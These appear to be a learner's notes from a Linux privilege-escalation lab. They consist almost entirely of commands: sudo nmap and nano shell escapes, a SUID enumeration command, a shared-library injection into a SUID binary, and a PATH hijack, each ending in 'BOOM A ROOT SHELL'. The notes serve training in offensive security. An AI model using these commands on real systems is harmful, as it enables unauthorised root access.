### nmap privesc: echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse

### nano privesc: sudo nano; /bin/sh; ^T

### SUID privesc enum: find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null


## Task 12 steps:

### 1- run /usr/local/bin/suid-so

### 2- strace suid-so: strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

### 3- create config directory: mkdir /home/user/.config

### 4- make a shared library from the libcalc.c file: gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c

### 5- EXPLOIT: /usr/local/bin/suid-so

## BOOM A ROOT SHELL!


## Task 13 steps:

### 1- run /usr/local/bin/suid-env

### 2- strings /usr/local/bin/suid-env

### 3- make a service: gcc -o service /home/user/tools/suid/service.c

### 4- EXPLOIT: PATH=.:$PATH /usr/local/bin/suid-env

## BOOM A ROOT SHELL!
